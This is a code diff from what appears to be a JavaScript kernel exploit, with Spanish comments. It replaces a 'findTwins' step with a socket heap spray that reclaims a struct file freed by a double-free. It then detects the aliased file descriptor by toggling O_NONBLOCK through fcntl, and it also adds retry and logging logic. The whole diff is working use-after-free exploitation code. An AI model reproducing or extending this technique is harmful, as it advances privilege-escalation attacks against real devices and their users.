@@ -934,13 +934,44 @@ let allDone = false;
             rebootRequired = true;
             mark("DOUBLE-FREE", "dup=" + d1 + " closed");
 
-            twins = findTwins(MAX_ROUNDS_TWIN);
-            if (!twins) {
+            // ── Spray de sockets para reclamar el struct file liberado ──
+            const sprayFds = [];
+            for (let i = 0; i < 512; ++i) {
+                const s = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+                if (s === -1) break;
+                sprayFds.push(s);
+            }
+            mark("FILE-SPRAY", "n=" + sprayFds.length);
+
+            // ── Detección de alias bidireccional via O_NONBLOCK ──
+            let partner = 0;
+            for (const s of sprayFds) {
+                const cfl = sc(SYS.fcntl, s, 3, 0).i32;       // F_GETFL
+                if (cfl < 0) continue;
+                
+                sc(SYS.fcntl, s, 4, cfl | 4);                 // F_SETFL | O_NONBLOCK
+                const a = sc(SYS.fcntl, uafSock, 3, 0).i32;
+                sc(SYS.fcntl, s, 4, cfl);
+                if (a >= 0 && (a & 4) !== 0) { partner = s; break; }
+
+                const ufl = sc(SYS.fcntl, uafSock, 3, 0).i32;
+                if (ufl < 0) continue;
+                sc(SYS.fcntl, uafSock, 4, ufl | 4);
+                const b = sc(SYS.fcntl, s, 3, 0).i32;
+                sc(SYS.fcntl, uafSock, 4, ufl);
+                if (b >= 0 && (b & 4) !== 0) { partner = s; break; }
+            }
+
+            mark("ALIAS-PROBE", "tested=" + sprayFds.length + " partner=" + (partner || "-"));
+            if (!partner) {
+                for (const s of sprayFds) sc(SYS.close, s);
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
-                mark("ATTEMPT-RETRY", "after=no-twins next="
-                    + (attempt + 1) + "/" + NUM_ATTEMPT);
+                mark("ATTEMPT-RETRY", "after=no-alias next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                 continue;
             }
+            
+            mark("TWINS", "uafSock=" + uafSock + " partner=" + partner + " n=" + sprayFds.length);
+            twins = { a: uafSock, b: partner, sprayFds: sprayFds };
             mark("TWINS", "a=" + twins.a + " b=" + twins.b
                 + " round=" + twins.round);
 
